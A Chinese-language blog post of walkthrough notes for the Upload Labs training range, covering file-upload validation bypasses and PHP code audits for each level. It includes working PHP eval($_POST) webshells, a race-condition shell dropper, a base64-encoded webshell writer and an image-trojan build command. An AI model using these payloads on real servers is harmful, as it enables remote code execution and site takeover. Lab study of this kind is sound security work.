---
title: Upload Labs 通关笔记：文件上传校验、绕过方式与代码审计
description: 记录 Upload Labs 各关卡的文件上传验证、常见绕过方式及相关 PHP 代码审计过程。
date: 2024-11-14
published: 2024-11-21
updated: 2024-11-21
categories:
  - 技术
  - 网络安全
tags:
  - CTF
  - 文件上传
  - 代码审计
  - PHP
type: story
image: /article-assets/2024/upload-labs/images/cover.webp
---

::quote
#icon
[Upload Labs]{style="color: var(--c-primary)"}
#default
文件上传 · 校验绕过 · 代码审计
::

## 常见绕过方式：
### 一、前端绕过
1. <strong>修改文件后缀名</strong>：攻击者可以将恶意文件的后缀名修改为系统允许上传的文件类型，如将.php文件修改为.jpg文件，然后通过抓包修改Content-Type或其他相关字段来绕过前端校验。
2. <strong>禁用JavaScript</strong>：通过禁用浏览器的JavaScript功能，可以绕过前端的一些校验逻辑。
3. <strong>删除或修改前端校验函数</strong>：直接修改网页中的JavaScript代码，删除或修改用于校验文件类型的函数。

### 二、黑名单绕过
1. <strong>等价扩展名绕过</strong>：利用系统黑名单的不完善性，使用与黑名单中文件类型等价的扩展名进行上传，如.php3、.php4、.php5、.phtml等。
2. <strong>.htaccess文件绕过</strong>：通过上传.htaccess文件，配置Apache服务器将特定类型的文件（如.jpg）当作PHP文件解析执行。
3. <strong>大小写绕过</strong>：在Windows系统中，文件后缀名的大小写不敏感，因此可以通过将.php文件的后缀名修改为.PHP、.PhP等方式进行绕过。
4. <strong>空格、点号、`::_D__A__T__A_`绕过</strong>：在文件后缀名后添加空格、点号或::DATA字符串，利用系统处理文件时的特性进行绕过。这些字符在Windows系统中可能会被自动去除或忽略，导致文件被当作PHP文件处理。
5. <strong>双写绕过</strong>：当系统使用str_ireplace等函数替换黑名单中的后缀时，如果替换次数不足，攻击者可以通过双写后缀名（如.pphphp）来绕过限制。

### 三、白名单绕过
1. <strong>MIME类型绕过</strong>：通过修改上传文件的MIME类型字段，将其伪装为系统允许上传的文件类型。
2. <strong>00截断绕过</strong>：在某些情况下，攻击者可以利用系统处理文件名时的漏洞，通过添加00字节（%00或\0）来截断文件名，从而绕过系统的文件类型检测。这种方式通常要求PHP版本小于5.3.4且magic_quotes_gpc配置为Off。

### 四、其他绕过方式
1. <strong>目录遍历绕过</strong>：攻击者可以通过修改文件路径中的特殊字符或使用相对路径来绕过系统的路径限制，从而将文件上传到系统的其他目录中。
2. <strong>文件包含漏洞绕过</strong>：某些系统在处理上传文件时存在文件包含漏洞，攻击者可以通过上传包含恶意代码的文件并利用文件包含漏洞来执行任意代码。
3. <strong>二次渲染绕过</strong>：当上传的图片文件被服务器进行二次渲染处理时，攻击者可以通过在图片中嵌入恶意代码并绕过渲染处理来保持代码的执行能力。然而，这种方式通常比较困难且容易被检测到。
4. <strong>竞争条件绕过</strong>：在文件上传后和删除文件之间存在一个短暂的时间差时，攻击者可以利用这个时间差完成竞争条件的上传漏洞攻击。例如，先上传一个WebShell脚本文件，然后立即访问该文件以触发WebShell的生成和执行。

## pass-1
`<?php @eval($_POST["crow"]);?>`  其中crow是密码 可直接修改

法一： 在burp suite中将jpg改php

法二：禁用JavaScript


## pass-2

![](/article-assets/2024/upload-labs/images/screenshot-001.webp)

可知 php可上传且抓包 说明检验在后端进行

删去Content-Type发出提示文件 说明可能以此为检验（不排除多条件判断）

故将php的type类型改为jpg的类型即可

## pass-3
该文件能被检测并提示禁止提交文件 说明是在后端检测的

限制部分文件 故提交后改不限制文件如.php3  .php5  .phtml 都可以以php形式解析


![](/article-assets/2024/upload-labs/images/screenshot-002.webp)

故在提交时抓包修改文件格式即可

## pass-4
写.htaccess文件 内容为将jpg文件改为php文件 

格式为  <mark style="background-color: #FBDE28; color: #222">AddType application/x-httpd-php</mark> .jpg .txt     （黄色表示 将php文件转化为.jpg 和 .txt文件）

用靶场先提交.htaccess文件 再提交.jpg文件（一句话木马的） :(<span style="color: #DF2A3F">.htaccess文件前面不能有字符</span>


## pass-5(.user.ini绕过)
后端检验		使用php.7.x以上版本 否则乱码 此处可用nst版本 

### 绕过方法一(.user.ini绕过)：
写.user.ini文件： <mark style="background-color: #FBDE28; color: #222">auto_prepend_file=yjhmm.jpg</mark>   （预先包含yjhmm.jpg）

在yjhmm.php中写一句话木马：

<mark style="background-color: #FBDE28; color: #222"><?php </mark>

<mark style="background-color: #FBDE28; color: #222">@eval(\$_POST`['a']`);</mark>

<mark style="background-color: #FBDE28; color: #222">echo"包含成功<br/>"</mark>

<mark style="background-color: #FBDE28; color: #222">?></mark>

之后将yjhmm.php改为.jpg文件

先提交.user.ini再提交yjhmm.jpg后   在新网页打开readme.php查看提交结果（[http://sirens/upload/readme.php](http://sirens/upload/readme.php)）


补充：针对Apache

#### .htaccess
作用：分布式配置文件，一般用于URL重写，认证，访问控制等

作用范围：特定目录（一般是网站根目录）及其子目录

优先级：较高，可覆盖Apache的主要配置文件(httpd-conf)

生效方式：修改后立即生效

#### httpd-conf
作用：包含Apache HTTP 服务器的全局行为和默认设置

作用范围：整个服务器

优先级：较低

生效方式：管理员权限，重启服务器后生效

#### .user.ini
作用:特定于用户或特定目录的配置文件,通常位于·Web·应用程序的根目录下。它用于覆盖或追加全局配置文件(如 php.ini)中的PHP配置选项。

作用范围:存放该文件的目录以及其子目录

优先级:较高，可以覆盖 php.ini

生效方式:立即生效

#### php.ini
作用:存储了对整个·PHP.环境生效的配置选项。它通常位于PHP安装目录中

作用范围:所有运行在该·PHP.环境中的PHP请求

优先级:·较低

生效方式：重启php或web服务器


加载方式：会首先加载php.ini/httpd_conf文件中的配置。然而，如果在某个目录下存在。user.ini/.htaccess文件，服务器会在处理请求时检查该目录，并覆盖相应的配置项


#### user.ini文件上传漏洞的前提:
.user.ini 可以生效并且该上传目录有 php 文件

写法:

Auto-prepend-file = 111.txt(这个文件里面只包含 php代码)

eg:

A: echo"hello".php.    b: echo"word".txt   （同一目录下存在A文件 b文件）

   echo"<strong>*"  ---->表示输出</strong>*

Auto-prepend-file.·b.txt———>输出结果为：helloword

表示在该目录下执行之前都会预先包含b.txt的语序   在eg中则会先执行A文件

### 补充绕过方法二(. .绕过)：(第十关也可)
点加空格加点绕过

直接提交yjhmm.php文件 在burp suite中修改为文件后缀   . .


## pass-6(大写绕过)：
后端检验

提交.php文件 在burp suite中修改后缀 使其中一个为大写即可

## pass-7(空格绕过)：
后端检验

提交.php文件 在burp suite中在后缀补上空格 即可

## pass-8(后缀加点绕过)：
后端检验

提交.php文件 在burp suite中在后缀补上  .  即可

## pass-9(::\$data绕过):
实质 提交1.php::\$data让服务器误以为提交数据流 待我们提交数据流后 复制图片链接 去掉::\$data 测试链接即可

### 额外数据流：
在Windows操作系统中，当你看到文件名后跟着"::\$DATA"时，<span style="color: #DF2A3F">它表示文件的一个附加数据流(Altermate·DataStream，ADS)。</span>数据流是一种用于在文件内部存储额外数据的机制。

在普通情况下，我们使用的文件只有一个默认的数据流，可以通过文件名访问。但是Windows·NT.文件系统(NTFS)支持在文件内部创建额外的数据流，以存储其他信息。这些额外的数据流可以通过在文件名后面添加"::\$DATA"来访问。

例如，"1.txt"是一个文件，而"1.txt::\$DATA"是这个文件的一个附加数据流。这样的数据流可以用于存储文件的元数据、备份信息、标签等。

需要注意的是，大多数常规的文件操作工具不会意识到这些额外的数据流，而只会处理默认的数据流。要访问或操作这些附加数据流，通常需要使用特定的命令行工具或编程接口。

写入方法：

echo+内容 >> 文件名: 数据流名

type+文件名 >> 文件名:数据流名

查看方法:

notepad 文件名：数据流名

<span style="color: #DF2A3F">在目录下面用cmd输入  如有一文件为   1.txt   (内容123213)</span>

<span style="color: #DF2A3F">输入 echo "你好" >>1.txt:nihao  --->数据流名随便取</span>

<span style="color: #DF2A3F">notepad 1.txt : nihao  ----->页面显示“你好”</span>

<span style="color: #DF2A3F">--------------------------------------------------------------</span>

<span style="color: #DF2A3F">若想附加文件内容 将文件  2.txt (内容 大家好我爱学web安全) 附加于 1.txt</span>

<span style="color: #DF2A3F">type 2.txt >> 1.txt:study ------>自由命名</span>

<span style="color: #DF2A3F">notepad 1.txt : study  ------>显示2.txt文本内容 此时 删掉2.txt文件 使用notepad依然可以打开</span>


## pass-10(点空格点绕过):
点加空格加点绕过

直接提交yjhmm.php文件 在burp suite中修改为文件后缀   . .

## pass-11(双写后缀绕过):

```php
 $file_name = str_ireplace($deny_ext,"", $file_name);
```


str_ireplace为替换函数   对\$file_name（输入的字符串）搜寻并替换

\$deny_ext是需要被替换的字符串 把其替换为"" (空格)

绕过过程（从左到右）：

yjhmm.p<mark style="background-color: #FBDE28; color: #222">php</mark>hp

黄色部分被检测到变为空 故成功绕过

## pass-12(%00截断):

![](/article-assets/2024/upload-labs/images/screenshot-003.webp)关闭该项（魔术引号问题）版本并且小于5.3 

上传<span style="color: #DF2A3F">一句话木马的jpg</span>文件

注意在burp suite抓包中只是filename字符串 还不是文件本身

在抓包中  POST /Pass-12/index.php?save_path=../upload/ HTTP/1.1

<mark style="background-color: #FBDE28; color: #222">在upload/后加上yjhmm.php%00 </mark>（%00的目的是为了让缓存地址无效，因为yjhmm.php后面不能接子文件 %00目的就是为了让后面子文件失效从而上传成功)

<span style="color: #DF2A3F">随后使用蚁剑时 删去后面部分留下yjhmm.php即可</span>

### 空字符
0x00被认为是字符串结束标志（%00一样都表示空）

eg：

你好0x00.php

读取过程（从左到右）:

<mark style="background-color: #FBDE28; color: #222">.php</mark> 不被读取  ----->最终读取“你好”

------------------------------------------

%00是在URL编码中使用 

(url编码(一般用两位数字起步)先将ascii转为16进制，然后再加百分号)

0x00是在编程语言中使用

### 代码审计:

```php
$file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
//以下分析
$_FILES['upload_file']['name']
//（获取第几位）表示在字符串$_FILES['upload_file']['name']中搜寻最后一次出现"."的位置是第几位  （可知是在第一位  默认从0开始计数）
  substr($_FILES['upload_file']['name']
//（从哪获取）获取子字符串
```


eg:

1.php

被第二个函数输出2，从而substr获取第二位之后的字符串php  即最终\$file_ext=php

## pass-13(0x00截断):
<span style="color: #DF2A3F">关闭该项（魔术引号问题）版本并且小于5.3</span>

提交yjhmm.jpg文件

<span style="color: #DF2A3F">../upload/ </span> 在burp suite中该处添加yjhmm.php(再加一个任意字符)

随后将任意字符选中，使其由任意编码转换为00再提交即可

### 代码审计:
查看源代码时发现缓存地址是post请求，故不可在url中添加0x00

在抓包时发现在post处没有save_path 无法直接输入“空”(0x00)

## pass-14(字节标识绕过):
<span style="color: #DF2A3F">关闭该项（魔术引号问题）版本并且小于5.3</span>

<span style="color: #DF2A3F">5.2的版本并抓包</span>

法一：

<span style="color: #DF2A3F">将yjhmm.php(编码后用任何后缀都行)用16进制打开</span> 将其头两个数字转化为白名单中文件的开头 （让判断误以为是白名单中的文件格式 ） 

//（此开头数字决定文件后缀，eg:111.jpg   但十六进制编码前两位为89 50对应png 上传该靶场会被识别为png格式）

并将其直接提交获得附上    时间戳.文件格式

随后用文件包含漏洞（因为文件包含漏洞可以将其转化为用php形式识别） 在其url后<span style="color: #DF2A3F">加上?file=upload/时间戳.文件格式</span> 以此获得网址

//（文件包含漏洞中的文件包含会以php的形式展开）

<span style="color: #DF2A3F">最终在蚁剑直接添加即可 </span>  （其是指[http://sirens/include.php](http://sirens/include.php)）

//（?file=upload/    表示在get漏洞下 在upload下访问其子文件 若无该句话则可访问其同级文件）

法二：

输入cmd指令  ——  copy 2.png/b+yjhmm.php hack.png   表示将一句话木马插入到2.png文件下 变为图片马 组成新文件hack.png 可将此直接上传

获得  时间戳.文件格式

随后用文件包含漏洞 在其url后加上?file=upload/时间戳.文件格式 以此获得网址

最终将此网址在蚁剑直接添加即可（如[http://sirens/include.php?file=upload/2420241119125215.png](http://sirens/include.php?file=upload/2420241119125215.png)）   （其是指[http://sirens/include.php](http://sirens/include.php)）

### 图片字节标识：
JPG/JFIF(常见的照片格式):头两个字节为0xFF和0xD8。

PNG(无损压缩格式):头两个字节为0x89和0x50。

GIF(支持动画的图像格式):头两个字节为0x47和0x49。

BMP(Windows位图格式):头两个字节为:0x42和0x4D。

TIFFI(标签图像文件格式):头两个字节可以是不同的数值。


字节是计算机中存储和传输数据的基本单位，通常表示为一个八位(8-bit)的进制数字序列。00000000

Utf-8 中，一个英文字符占一个字节，中文(含繁体字)占三个字节

### 代码审计：
读取图片前两个字节 将其转为十进制 在switch语序下返回对应值从而判断出图片格式

## pass-15(图片马绕过):
<span style="color: #DF2A3F">关闭该项（魔术引号问题）版本并且小于5.3</span>

<span style="color: #DF2A3F">5.2的版本并抓包</span>

图片马生成

用cmd执行：copy 2.png/b+yjhmm.php hack .png  会生成图片hack.png

然后上传hack.png 得到  时间戳.文件格式

随后用文件包含漏洞 在其url后加上?file=upload/时间戳.文件格式 以此获得网址

最终在蚁剑直接添加即可   （其是指[http://sirens/include.php](http://sirens/include.php)）

### 代码审计

```php
$info = getimagesize($filename);
$ext = image_type_to_extension($info[2]);
//将图片内容进行解码 获取宽度 高度 并转化为一个常量值
```



getimagesize()函数返回一个包含图像信息的数组。该数组的索引如下所示:

索引0:图像的宽度(单位:像素)

索引1:图像的高度(单位:像素)

索引2:图像类型的常量值(可以使用·image type tomime type()·函数将其转换为·MIME

类型)

索引3:包含图像属性的字符串，以逗号分隔(如:“width=500,height=300”)←如果·getimagesize()·函数无法读取图像信息，则返回·false。否则，返回一个包含上述索引的数组。


IMAGETYPE GIF:代表GIF图像文件的常量值

IMAGETYPE JPEG:代表JPEG图像文件的常量值

IMAGETYPE PNG:代表PNG图像文件的常量值

IMAGETYPE SWF:代表SWF(Shockwave·Flash)文件的常量值

IMAGETYPE PSD:代表Adobe Photoshop的PSD 文件的常量值

IMAGETYPE BMP:代表·BMP·(Bitmap)图像文件的常量值


## pass-16(图片马绕过):

![](/article-assets/2024/upload-labs/images/screenshot-004.webp)

<span style="color: #DF2A3F">将其打开（打开php_exif.dll）并且为7.0nst版本</span>

图片马生成

用cmd执行：copy 2.png/b+yjhmm.php hack .png  会生成图片hack.png

然后上传hack.png 

上传图片马获得  时间戳.文件格式

随后用文件包含漏洞 在其url后加上?file=upload/时间戳.文件格式 以此获得网址

最终在蚁剑直接添加即可 （其是指[http://sirens/include.php](http://sirens/include.php)）

### 代码审计：

```php
$image_type = exif_imagetype($filename);
//直接判断图片类型 并在switch中返回图片类型
```


## pass-17(二次渲染绕过):
将jgp/png/gif图片先上传，随后<span style="color: #DF2A3F">从上交的upload中提取重写后的图片</span> 用来与原上交图片比对 找蓝色match部分 <span style="color: #DF2A3F">在相同未更改部分插入一句话木马</span>并保存该图片。

<span style="color: #DF2A3F">随后上交插入一句话木马后的图片 </span> 获得  时间戳.文件格式

随后用文件包含漏洞 在其url后加上?file=upload/时间戳.文件格式 以此获得网址

最终在蚁剑直接添加即可 （其是指[http://sirens/include.php](http://sirens/include.php)）

### 代码审计：

```php
 if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
   //如果路径成功移动，则第二个函数会重写图片 但展示内容不会变
```


## pass-18(条件竞争原理与绕过):
提交包含`<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["a"]); ?>`'); ?>的php文件（2.php）（或另一条）

抓包 发送 intruder  添加 &p=符号 符号


![](/article-assets/2024/upload-labs/images/screenshot-005.webp)

设置为numbers 并为random设置攻击次数

同时再发送一条查询该文件到达指定地址的地址，并抓包改为null payloads 和 continue indefinitely 去捕捉2.php

同时发起攻击 待upload中被写入shell.php 再用url查询shell.php地址 

在无报错时直接将改url码输入连接蚁剑即可


### 条件竞争原理：
举个例子:流水线

条线很轻松，但多条很累，可能出现差错

文件上传条件竞争前提:

服务器会先将任意类型文件放在服务器上，然后再判断合法性，非法则删除

文件上传条件竞争本质:

抢夺线程的资源，使得我们上传的生成木马的文件可以被快速访问运行一次，达到非法目的

### 代码审计：

```php
//文件从暂存地传入到服务器
if(move_uploaded_file($temp_file, $upload_file))
//以下是在服务器判断文件是否属于白名单 
{
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }
//在if还未来得及处理完的时候，抓住此时漏洞偷偷访问而达到目的
  要在持续攻击的状态下 1.php被执行

```


生成"小马"的语句

1.php: `<?php fputs(fopen('shell.php','w'),'<?php @eval($ _POST["a"])?>`');?>

/<span style="color: #ECAA04">/用fputs函数 打开shell.php资源，若无shell.php则创建该文件并以写入的方式将`<?php @eval($ _POST["a"])?>`写入shell.php中</span>


```php
<?php

$a='PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+';

$myfile = fopen("shell.php","w");

fwrite($myfile, base64_decode($a));

fclose($myfile);

?>
```



//加入了base64编码\$a

## pass-19(apache解析漏洞+条件竞争绕过):
本关以2.php（带小马）为例

在上传2.php时抓包改为2.php.7z 发送到服务器审查 发送intruder多次请求访问在服务器重命名之前

同时发送访问 待upload中被写入shell.php 再用url查询shell.php地址 

在无报错时直接将改url码输入连接蚁剑即可

### apache解析漏洞:
文件后加.7z (将文件归档或压缩如.rar .zip)

网站是从右至左审查 但apache解析不了.7z 故php文件因此可执行

### 代码审计：
同第十八关类似 但先检查文件后缀。故需apache解析漏洞+条件竞争绕过；

## pass-20(后缀绕过):、
在保存名称上 eg：1.php.(或空格或点空格或\)   或者用抓包提交1.php.0x00.jpg(0x00是空格20转为00的) 或者   1.php::\$DATA

### 代码审计：

```php
$file_ext = pathinfo($file_name,PATHINFO_EXTENSION);
//获得文件（保存名称）后缀  在保存名称上加后缀
如 1.jpg.jkp
  那么读取的文件类型就是jkp
```



![](/article-assets/2024/upload-labs/images/screenshot-006.webp)

这是post获取的文件名

## pass-21(审计+数组后缀绕过):
上传一句话木马111.php

保存名称为1.php

抓包


![](/article-assets/2024/upload-labs/images/screenshot-007.webp)

改为   image/jpeg

再修改为以下部分


![](/article-assets/2024/upload-labs/images/screenshot-008.webp)

ok 上传成功 直接复制连接即可

因为针对源代码 第一个数组是为执行文件

save_name`[(内容大于1即可)]`，因为要让拼接时的后面数组为null

### 代码审计：

```php
 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
//三目运算符 判断是否空 不空则save_name
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }
//若不是数组 则加上.分割 来变成数组 防止我们后缀绕过
//eg:  1.php
  //$file[0]=1
  //$file[1]=php
$file_name = reset($file) . '.' . $file[count($file) - 1];
//假设源代码中将文件数组中间设为多个无效null
//如此时仅三个数组 $file[0]=1   $file[1]=php    $file[8]=1 
//则此时count得到的是3 故$file[2]=null
最后拼接
```
